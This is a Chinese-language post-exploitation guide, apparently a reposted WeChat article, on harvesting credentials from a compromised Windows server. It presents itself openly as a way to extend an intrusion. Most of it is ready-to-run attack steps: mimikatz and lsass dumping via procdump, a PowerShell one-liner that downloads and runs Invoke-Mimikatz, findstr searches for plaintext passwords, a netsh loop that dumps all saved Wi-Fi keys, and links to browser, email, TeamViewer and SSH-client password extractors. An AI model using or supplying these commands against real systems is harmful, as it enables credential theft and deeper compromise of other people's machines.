\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/3QwQCoaa45SECdLo7DZ8xQ)

拿到一台 Windows 服务器权限，收集各种登录凭证以便扩大战果。本篇分享几个窃取 Windows 登录凭证的工具和技巧。

**1、Windows 本地密码 Hash**  

Windows 的系统密码 hash 默认情况下一般由两部分组成：第一部分是 LM-hash，第二部分是 NTLM-hash。Windows 系统下 hash 密码格式用户名称: RID:LM-HASH 值: NT-HASH 值。

例如：

```
Administrator:500:AF01DF70036EBACFAAD3B435B51404EE:44F077E27F6FEF69E7BD834C7242B040

用户名称为：Administrator
RID为：500
LM-HASH值为：AF01DF70036EBACFAAD3B435B51404EE
NT-HASH值为：44F077E27F6FEF69E7BD834C7242B040
```

**破解方式一：hash 在线破解网站**

```
https://www.objectif-securite.ch/ophcrack
http://cmd5.com
```

**破解方式二：mimikatz**

Github 地址：

```
https://github.com/gentilkiwi/mimikatz
```

```
privilege::debug
sekurlsa::logonpasswords
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4k7S2FiaDDryLRgEzJMdOZnuk7lod5yo1WDRTNUZDJDncas8YDp7EAVibeQ8x0U6mnCGmMMl3pXaMbw/640?wx_fmt=png)

**破解方式三：wce**  

```
wce的常用参数使用说明如下：

参数解释:
    -l     列出登录的会话和NTLM凭据（默认值）
    -s     修改当前登录会话的NTLM凭据 参数：<用户名>:<域名>:<LM哈希>:<NT哈希>
    -w     通过摘要式认证缓存一个明文的密码
```

**破解方式四：Powershell+mimikatz**

直接利用 poweshell 来调用 mimikatz 抓取系统内的明文密码。

```
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

**破解方式五：prodump+mimikatz**

procdump 是微软官方提供的一个小工具，微软官方下载地址：

```
https://technet.microsoft.com/en-us/sysinternals/dd996900
```

```
\# 将工具拷贝到目标机器上执行如下命令（需要管理员权限,我选择的版本是64位）
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 将生成的内存dump文件拷贝到mimikatz同目录下，双击打开mimikatz执行情况如图：
mimikatz # sekurlsa::minidump lsass.dmp
# Switch to MINIDUMP
mimikatz # sekurlsa::logonPasswords full
```

**2、抓取浏览器密码**

很多浏览器都提供了记住密码的功能，用户在登录一些网站的时候会选择记住密码。

LaZagne：提取浏览器所保存的密码

github 项目地址：

```
https://github.com/AlessandroZ/LaZagne
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4k7S2FiaDDryLRgEzJMdOZnuPJu1zfkAbicFNdoM55UGrE5DE5IA9PJdSyrql8ltmMk7IthragbgtCg/640?wx_fmt=png)

**3、服务端明文存储密码**

在一些配置文件或日志里，明文记录着敏感的密码信息，如 web.config、config.ini 等文件，可通过手动翻查敏感目录，也可以通过 findstr 命令来查找敏感文件和内容。

```
findstr /i /s "password" \*.config
findstr /i /s "password" \*.ini
findstr /i /s "password" \*.xml
```

**4、第三方运维工具托管密码解密**

常见的有 Linux 运维工具，如 Putty、xshell、winscp 等，RDP 管理工具，Remote Desktop Organizer，远控软件：Teamviewer 等。

xshell 密码解密工具：

```
https://github.com/dzxs/Xdecrypt
```

提取 WinSCP，PuTTY 等保存的会话信息：

```
https://github.com/Arvanaghi/SessionGopher
```

从内存中提取 TeamViewer 密码的工具：

```
https://github.com/attackercan/teamviewer-dumper
```

一键破解客户端星号密码 -- 星号密码查看器。  

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4k7S2FiaDDryLRgEzJMdOZnuZXSnoCjV1wN4icics6d1Z57koBJJFeianibEtwyMBg8AkodRlJtzlkFm8Q/640?wx_fmt=png)

**5、一键获取电脑 wifi 密码**

```
#查看电脑连接过的所有wifi
netsh wlan show profiles

#查看wifi信号为Aaron的密码
netsh wlan show profiles  key=clear

#CMD一键获取 所有连接过的WIFI密码
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```

**6、Windows 键盘记录工具**

可以记录用户键盘操作，从而捕获用户的敏感信息，在 github 和 T00ls 都可以找到这一类的源码和工具。

****7、Windows 密码提取工具合集****

各种 Windows 程序的密码提取工具，包括各种浏览器、邮箱、Windows 网络密码、无线网络密钥等。

IE 浏览器提取密码工具：

```
https://www.nirsoft.net/toolsdownload/iepv.zip
```

Firefox 浏览器密码提取工具：

```
https://www.nirsoft.net/toolsdownload/passwordfox-x64.zip
```

Chrome 浏览器密码提取工具：

```
https://www.nirsoft.net/toolsdownload/chromepass.zip
```

SVN 密码解密器：

```
http://www.leapbeyond.com/ric/TSvnPD/TSvnPwd\_source.zip
```

邮箱密码提取工具：

```
https://www.nirsoft.net/toolsdownload/mailpv.zip
```

提取. rdp 文件中存储的密码：

```
https://www.nirsoft.net/toolsdownload/rdpv.zip
```

MSSQL 凭据密码获取工具：

```
http://www.zcgonvh.com/zb\_users/upload/2015/2/mssql\_credentials\_pwd.zip
```